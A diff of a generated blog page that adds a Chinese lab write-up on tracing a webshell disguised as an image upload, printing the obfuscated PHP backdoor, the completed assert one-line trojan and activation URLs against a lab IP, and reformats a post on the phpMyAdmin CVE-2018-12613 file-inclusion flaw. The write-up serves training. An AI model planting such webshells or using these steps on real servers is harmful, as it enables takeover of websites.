@@ -62,6 +62,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-墨者WebShell代码分析溯源" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/03/墨者WebShell代码分析溯源/" class="article-date">
+  <time datetime="2019-04-03T05:38:18.000Z" itemprop="datePublished">2019-04-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/03/墨者WebShell代码分析溯源/">墨者WebShell代码分析溯源</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WebShell代码分析溯源"><a href="#WebShell代码分析溯源" class="headerlink" title="WebShell代码分析溯源"></a>WebShell代码分析溯源</h1><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>首先我们进入实验环境，下载系统源码</p>
+<p>在源码  www_bak\Assets\upload  中找到伪装成  .jpg  的  pic3.jpg.php  因为它出现在upload文件夹中。</p>
+<p>在文件中找到以下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];     <span class="comment">//php request请求</span></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line">array_map(base64_decode($e), $arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一句话木马并不完整，我们要利用request请求把它补全：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'s'</span>]);<span class="meta">?&gt;</span>   <span class="comment">//完整的一句话木马</span></span><br></pre></td></tr></table></figure>
+<p>补全时吧assert转为base64</p>
+<p>构建url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43185/www/Asset/upload/pic3.jpg.php?e=YXNzZXJ0</span><br></pre></td></tr></table></figure>
+<p>使用菜刀连接：</p>
+<p><img src="https://i.loli.net/2019/04/03/5ca47e4d49d1b.png" alt=""></p>
+<p>在html下找到key</p>
+<h3 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h3><p>第七题和第六题大致相同</p>
+<p>构建url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:40007/www/random_int.php?e=YXNzZXJ0</span><br></pre></td></tr></table></figure>
+<p>这次有问题的代码在www/random_int.php</p>
+<p>使用菜刀连接即可：</p>
+<p><img src="https://i.loli.net/2019/04/03/5ca48c44e3533.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/03/墨者WebShell代码分析溯源/" data-id="cju137q7j0003tsu6ks8dhpod" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-CVE-2018-12613" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/03/26/CVE-2018-12613/" class="article-date">
@@ -96,7 +150,7 @@
 <p>下面我们来做题</p>
 <p>寻找到目标文件目录地址：</p>
 <p>漏洞产生在index.php的55~63行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// If we have a valid target, let&apos;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! preg_match(&apos;/^index/&apos;, $_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&apos;target&apos;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&apos;target&apos;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&apos;target&apos;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">参考大佬博客：https://www.jianshu.com/p/fb9c2ae16d09</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If we have a valid target, let's load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">参考大佬博客：https:<span class="comment">//www.jianshu.com/p/fb9c2ae16d09</span></span><br></pre></td></tr></table></figure>
 <p>我们找到index.php的文件路径就可以利用漏洞</p>
 <p><img src="https://i.loli.net/2019/03/27/5c9ae8011c4c2.png" alt=""></p>
 <p>找到index.php在    /var/www/html    中</p>
@@ -119,7 +173,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/26/CVE-2018-12613/" data-id="cjtqnugwr0000awu6sqb0o0kp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/26/CVE-2018-12613/" data-id="cju137q780000tsu6cmuzad8l" class="article-share-link">Share</a>
       
       
     </footer>
@@ -157,7 +211,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/13/python requests/" data-id="cjtqnugxl0001awu6atzf6ra8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/13/python requests/" data-id="cju137q7g0001tsu6546wukrs" class="article-share-link">Share</a>
       
       
     </footer>
@@ -234,7 +288,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/01/29/python/" data-id="cjtqnugy30002awu6z4082r2b" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/01/29/python/" data-id="cju137q7i0002tsu6t2ganuqj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -262,7 +316,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
     </div>
   </div>
 
@@ -273,6 +327,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/04/03/墨者WebShell代码分析溯源/">墨者WebShell代码分析溯源</a>
+          </li>
         
           <li>
             <a href="/2019/03/26/CVE-2018-12613/">CVE-2018-12613</a>
